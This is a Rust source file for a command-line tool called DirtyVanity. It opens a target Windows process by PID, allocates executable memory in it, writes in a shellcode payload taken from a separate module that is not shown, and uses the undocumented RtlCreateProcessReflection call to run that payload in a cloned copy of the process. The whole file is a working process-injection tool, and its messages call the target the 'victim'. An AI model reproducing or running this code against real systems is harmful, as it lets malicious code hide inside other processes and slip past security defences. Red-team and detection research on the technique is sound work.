use std::ptr::null_mut;

use windows::{
    core::{s, Error, Result},
    Win32::{
        Foundation::{HANDLE, STATUS_SUCCESS},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetProcAddress, LoadLibraryA},
            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
            Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_DUP_HANDLE, PROCESS_VM_OPERATION, PROCESS_VM_WRITE},
        },
    },
};

use crate::shellcode::{ClientId, RtlCreateProcessReflectionFn, RtlpProcessReflectionInformation, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, SHELLCODE};

mod shellcode;


fn main() -> Result<()>{
    // pid

    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2{
        println!("[+] Usage: DirtyVanity [TARGET_PID_TO_REFLECT]");
        return Err(windows::core::Error::from_win32());
    }

    let pid: u32 = args[1].parse().map_err(|_|{
        println!("[-] USAGE: Invalid PID choice: {}", args[1]);
        Error::from_win32()
    })?;

     let handle = unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
            true,
            pid,
        )?
    };

    println!("[+] Got a handle to PID {} successfully", pid);

    let shell_len = SHELLCODE.len();
    let base_addr = unsafe{
        VirtualAllocEx(
            handle,
            None,
            SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if base_addr.is_null(){
        println!("[-] Unable to Allocate Space");
        return Err(Error::from_win32());
    }

    println!("[+] Allocated space for shellcode at start address: {:p}", base_addr);

    // write shellcode to process

    let mut bytes_written = 0;

    unsafe {
        WriteProcessMemory(
            handle,
            base_addr, 
            SHELLCODE.as_ptr() as *const _,
            shell_len,
            Some(&mut bytes_written)
        )?;
    }

    println!("[+] Successfully wrote shellcode to victim. About to start the Mirroring");


    let ntdll = unsafe { LoadLibraryA(s!("ntdll.dll"))? };
    let rtl_create_process_reflection: RtlCreateProcessReflectionFn = unsafe {
        let proc = GetProcAddress(ntdll, s!("RtlCreateProcessReflection")).expect("[-] Error obtaining Address of RtlCreateProcessReflection...");
        std::mem::transmute(proc)
    };

    let mut reflection_info = RtlpProcessReflectionInformation {
        reflection_process_handle: HANDLE(null_mut()),
        reflection_thread_handle: HANDLE(null_mut()),
        reflection_client_id: ClientId {
            unique_process: HANDLE(null_mut()),
            unique_thread: HANDLE(null_mut()),
        },
    };

    let status = unsafe {
        rtl_create_process_reflection(
            handle,
            RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
            base_addr,
            null_mut(),
            HANDLE(null_mut()),
            &mut reflection_info,
        )
    };

    if status == STATUS_SUCCESS {
        println!(
            "[+] Successfully Mirrored to new PID: {}",
            reflection_info.reflection_client_id.unique_process.0 as u32
        );
    } else {
        println!("[!] Error Mirroring: ERROR {}", status.0);
    }

    Ok(())
}
